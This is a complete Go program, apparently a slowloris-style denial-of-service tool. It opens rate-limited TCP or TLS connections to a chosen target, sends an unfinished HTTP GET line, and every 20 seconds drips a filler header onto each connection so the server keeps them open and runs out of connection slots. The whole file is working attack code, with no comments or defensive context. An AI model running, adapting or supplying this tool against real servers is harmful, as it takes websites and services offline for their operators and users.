package main

import (
	"context"
	"crypto/tls"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"os/signal"
	"sync"
	"time"

	"golang.org/x/time/rate"
)

var (
	target       = flag.String("target", "", "")
	useTLS       = flag.Bool("use-tls", false, "")
	newConnLimit = flag.Float64("new-conn-limit", 1.0, "")
)

type Dripper struct {
	lock sync.Mutex

	useTLS      bool
	target      string
	conns       []net.Conn
	connLimiter *rate.Limiter
}

func (d *Dripper) runConnAdder(ctx context.Context) {
	firstConn := true
	for {
		if err := d.connLimiter.Wait(ctx); err != nil {
			return
		}

		if err := d.addOneConn(ctx); err != nil {
			log.Printf("Error creating connection: %v", err)
			if firstConn {
				log.Fatalf("Shutting down because first connection failed")
			}
		}

		firstConn = false
	}
}

const httpPreamble = "GET /abc HTTP/1.1\n"

func (d *Dripper) addOneConn(ctx context.Context) error {
	tcpConn, err := net.Dial("tcp", d.target)
	if err != nil {
		return fmt.Errorf("while dialing %q: %w", d.target, err)
	}

	conn := tcpConn
	if *useTLS {
		conn = tls.Client(tcpConn, &tls.Config{InsecureSkipVerify: true})
	}

	if _, err := conn.Write([]byte("GET /abc HTTP/1.1\n")); err != nil {
		return fmt.Errorf("while writing HTTP intro to conn: %w", err)
	}

	d.lock.Lock()
	defer d.lock.Unlock()
	d.conns = append(d.conns, conn)

	return nil
}

func (d *Dripper) runConnDripper(ctx context.Context) {
	ticker := time.NewTicker(20 * time.Second)
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
		}

		d.lock.Lock()

		for i, conn := range d.conns {
			if _, err := conn.Write([]byte("ABC: DEF\n")); err != nil {
				d.conns[i] = d.conns[len(d.conns)-1]
				d.conns = d.conns[:len(d.conns)-1]
			}
		}

		d.lock.Unlock()
	}
}

func main() {
	ctx, cancel := context.WithCancel(context.Background())

	flag.Parse()

	d := &Dripper{
		useTLS:      *useTLS,
		target:      *target,
		connLimiter: rate.NewLimiter(rate.Limit(*newConnLimit), 1),
	}

	go d.runConnAdder(ctx)
	go d.runConnDripper(ctx)

	quitChan := make(chan os.Signal)
	signal.Notify(quitChan, os.Interrupt)
	select {
	case <-quitChan:
	}

	cancel()
}
